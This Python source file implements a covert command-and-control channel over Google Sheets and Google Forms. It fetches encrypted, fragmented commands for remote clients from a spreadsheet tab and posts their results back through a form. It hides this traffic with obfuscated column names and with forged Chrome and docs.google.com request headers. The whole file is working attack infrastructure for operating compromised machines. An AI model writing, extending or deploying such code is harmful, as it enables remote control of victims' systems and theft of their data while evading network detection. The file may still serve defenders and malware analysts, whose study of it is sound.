import csv
import io
import json
import os

import requests

import common
from channel.base import Channel


def _get_column_map(env_key):
    """Load {logical_name: obfuscated_col_name} from env var.
    Returns empty dict if unset — code uses logical column names as-is.
    """
    raw = os.environ.get(env_key, "").strip()
    if not raw:
        return {}
    try:
        return json.loads(raw)
    except json.JSONDecodeError:
        print(f"[warn] {env_key} is not valid JSON — falling back to logical column names")
        return {}


def _translate_row(row, column_map):
    """Translate obfuscated column header keys → logical names using reverse of column_map.
    Keys not present in the map (e.g. form_timestamp) pass through unchanged.
    """
    if not column_map:
        return row
    reverse = {v: k for k, v in column_map.items()}
    return {reverse.get(k, k): v for k, v in row.items()}


_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/124.0.0.0 Safari/537.36"
)

# Headers for GET requests (CSV export reads) — looks like browser navigation
_GET_HEADERS = {
    "User-Agent":                _UA,
    "Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language":           "en-US,en;q=0.9",
    "Accept-Encoding":           "gzip, deflate, br",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Site":            "none",
    "Sec-Fetch-Mode":            "navigate",
    "Sec-Fetch-Dest":            "document",
}


def _post_headers(form_url):
    """Headers for form POST requests — looks like a Chrome browser submitting a Google Form."""
    return {
        "User-Agent":      _UA,
        "Accept":          "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Origin":          "https://docs.google.com",
        "Referer":         form_url,
        "Sec-Fetch-Site":  "same-origin",
        "Sec-Fetch-Mode":  "cors",
        "Sec-Fetch-Dest":  "empty",
    }


def sheet_url(gid):
    """Build CSV export URL for a tab."""
    sid = os.environ["SPREADSHEET_ID"]
    return f"https://docs.google.com/spreadsheets/d/{sid}/export?format=csv&gid={gid}"


def read_tab(gid, timeout=15):
    """Fetch a tab as list of dicts via CSV export."""
    url = sheet_url(gid)
    resp = requests.get(url, headers=_GET_HEADERS, timeout=timeout)
    resp.raise_for_status()
    reader = csv.DictReader(io.StringIO(resp.text))
    rows = []
    for row in reader:
        try:
            rows.append(dict(row))
        except Exception:
            continue
    return rows


def read_config():
    """Read config tab — deprecated, kept for backward compatibility."""
    gid = os.environ["CONFIG_GID"]
    rows = read_tab(gid)
    column_map = _get_column_map("CONFIG_COLUMN_MAP")
    enc = common.get_encryptor()
    result = {}
    for row in rows:
        row = _translate_row(row, column_map)
        row = common._decrypt_row(row, enc)
        if "key" in row and "value" in row:
            result[row["key"]] = row["value"]
    return result


class SheetsChannel(Channel):
    def __init__(self):
        super().__init__()
        # Sheets CSV reads are cheap — 5s default gives prompt result visibility.
        # The operator can override with 'refresh <sec>' and the heartbeat handler
        # will auto-sync this to the client's actual cycle interval once one arrives.
        self._refresh_interval = 5.0

    def read_inbox(self):
        gid = os.environ["INBOX_GID"]
        rows = read_tab(gid)
        column_map = _get_column_map("INBOX_COLUMN_MAP")
        enc = common.get_encryptor()
        result = []
        for row in rows:
            row = _translate_row(row, column_map)
            row = common._decrypt_row(row, enc)
            result.append(row)
        return common._reassemble_fragments(result, "payload", "pending")

    def read_outbox(self):
        gid = os.environ["OUTBOX_GID"]
        rows = read_tab(gid)
        column_map = _get_column_map("OUTBOX_COLUMN_MAP")
        enc = common.get_encryptor()
        result = []
        for row in rows:
            row = _translate_row(row, column_map)
            row = common._decrypt_row(row, enc)
            result.append(row)
        return common._reassemble_fragments(result, "result", "success")

    def write_result(self, data):
        enc = common.get_encryptor()
        encrypted = common._encrypt_row(data, enc)
        url = os.environ["FORMS_URL"]
        field_map = json.loads(os.environ["FORMS_FIELD_MAP"])
        payload = {entry_id: encrypted.get(field, "") for field, entry_id in field_map.items()}
        try:
            resp = requests.post(url, data=payload, headers=_post_headers(url), timeout=15)
            return resp.ok or resp.status_code in (301, 302, 303)
        except Exception as e:
            print(f"[error] write_result failed: {e}")
            return False

    def write_task(self, data):
        enc = common.get_encryptor()
        encrypted = common._encrypt_row(data, enc)
        url = os.environ["INBOX_FORMS_URL"]
        field_map = json.loads(os.environ["INBOX_FORMS_FIELD_MAP"])
        payload = {entry_id: encrypted.get(field, "") for field, entry_id in field_map.items()}
        try:
            resp = requests.post(url, data=payload, headers=_post_headers(url), timeout=15)
            return resp.ok or resp.status_code in (301, 302, 303)
        except Exception as e:
            print(f"[error] write_task failed: {e}")
            return False

    def build_outbox_fragments(self, data, chunks):
        total = len(chunks)
        return [
            {
                "command_id": data["command_id"],
                "client_id": data.get("client_id", ""),
                "status": f"frag:{i}:{total}",
                "result": chunk,
                "timestamp": data.get("timestamp", ""),
            }
            for i, chunk in enumerate(chunks)
        ]

    def build_inbox_fragments(self, data, chunks):
        total = len(chunks)
        return [
            {
                "command_id": data["command_id"],
                "command": data.get("command", ""),
                "payload": chunk,
                "target": data.get("target", ""),
                "status": f"frag:{i}:{total}",
                "created_at": data.get("created_at", ""),
            }
            for i, chunk in enumerate(chunks)
        ]
